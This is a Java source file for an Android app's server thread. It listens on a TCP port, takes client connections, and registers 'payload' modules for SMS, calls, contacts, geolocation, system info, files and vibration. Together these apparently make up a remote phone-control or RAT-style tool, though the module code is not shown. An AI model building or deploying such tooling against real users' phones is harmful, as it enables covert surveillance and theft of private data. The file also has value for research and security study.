package com.core;

import android.app.Activity;
import android.widget.Toast;
import com.core.payloads.Calls;
import com.core.payloads.Contacts;
import com.core.payloads.Files;
import com.core.payloads.Geolocation;
import com.core.payloads.Payloads;
import com.core.payloads.Sms;
import com.core.payloads.Sys;
import com.core.payloads.Vibrator;
import com.corelib.IPayload;
import java.io.IOException;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketException;
import java.util.ArrayList;
import java.util.Enumeration;

/**
 * Created by hkff on 4/21/15.
 * Thread server
 */
public class ServerThread extends Thread {

    ServerSocket serverSocket;
    private int serverPort;
    private Activity activity;

    // Payloads list
    private static ArrayList<IPayload> payloads = new ArrayList<IPayload>();


    /**
     * Constructor
     * @param activity : the parent activity
     * @param port : the server port
     */
    public ServerThread(Activity activity, int port) {
        this.serverPort = port;
        this.activity = activity;
        this.loadPayloads();
    }


    /**
     * Load payloads
     * Dynamically using reflection TODO
     */
    public void loadPayloads() {
        ServerThread.payloads.add(new Payloads(activity));
        ServerThread.payloads.add(new Sms(activity));
        ServerThread.payloads.add(new Calls(activity));
        ServerThread.payloads.add(new Contacts(activity));
        ServerThread.payloads.add(new Geolocation(activity));
        ServerThread.payloads.add(new Sys(activity));
        ServerThread.payloads.add(new Files(activity));
        ServerThread.payloads.add(new Vibrator(activity));
    }


    /**
     * Get loaded payloads
     * @return
     */
    public static ArrayList<IPayload> getPayloads() {
        return ServerThread.payloads;
    }

    /**
     * Remove a payload
     * @param payload
     */
    public static void removePayload(IPayload payload) {
            ServerThread.payloads.remove(payload);
    }

    /**
     * Add a payload
     * @param payload
     */
    public static void addPayload(IPayload payload) {
        ServerThread.payloads.add(payload);
    }

    /**
     * The run method of the thread
     */
    @Override
    public void run() {
        //Socket socket;
        try{
            // Print ips
            System.out.println(this.getIps());

            // We start the serverSocket on the port serverPort
            serverSocket = new ServerSocket(this.serverPort);

            // We want to show a message to indicate that the server started
            // Since we are in a different thread, and only the UI thread can
            // perform graphical interactions, we need to specify that
            // we want to run this action on the main activity thread
            activity.runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    // We show a popup to indicate that the server started
                    Toast.makeText(activity, "Server Started at port " + serverPort, Toast.LENGTH_SHORT).show();
                }
            });


            // We loop waiting for client connection until the server is stopped
            while (!Thread.currentThread().isInterrupted()) {
                // We wait for a client
                Socket socket = serverSocket.accept();
                // Run a thread to handle the client and wait for another connexion
                ClientHandler chandler = new ClientHandler(socket);
                chandler.start();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

        // We show a message on the UI, we use runOnUiThread for the same reasons
        // as previously
        activity.runOnUiThread(new Runnable() {
            @Override
            public void run() {
                // We show a popup to indicate that the server is off
                Toast.makeText(activity, "Server exiting... ", Toast.LENGTH_SHORT).show();
            }
        });
    }


    /**
     * Close the server connection
     */
    public void exit() {
        try {
            this.interrupt();
            this.serverSocket.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    /**
     * Get ip addresses
     * @return
     */
    public String getIps() {
        String ip,ips = "";
        try {
            Enumeration<NetworkInterface> interfaces = NetworkInterface.getNetworkInterfaces();
            while (interfaces.hasMoreElements()) {
                NetworkInterface iface = interfaces.nextElement();
                // filters out 127.0.0.1 and inactive interfaces
                if (iface.isLoopback() || !iface.isUp())
                    continue;

                Enumeration<InetAddress> addresses = iface.getInetAddresses();
                while(addresses.hasMoreElements()) {
                    InetAddress addr = addresses.nextElement();
                    ip = addr.getHostAddress();
                    ips += iface.getDisplayName() + " " + ip + "\n";
                }
            }
        } catch (SocketException e) {
            throw new RuntimeException(e);
        }
        return ips;
    }

}